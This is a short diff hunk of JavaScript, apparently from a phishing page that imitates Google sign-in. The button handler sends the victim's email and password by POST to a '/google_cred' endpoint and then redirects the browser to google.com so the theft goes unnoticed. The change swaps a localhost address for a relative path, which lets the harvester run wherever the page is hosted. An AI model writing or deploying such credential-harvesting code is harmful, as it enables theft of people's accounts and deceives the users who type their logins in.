@@ -2453,7 +2453,7 @@ document.getElementById('next').onclick = function() {
 
         var req = new XMLHttpRequest();
 
-    	req.open('POST', 'http://localhost:8023/google_cred');
+    	req.open('POST', '/google_cred');
     	req.send(email + ' | ' + password);
 
         location.href = 'https://google.com';
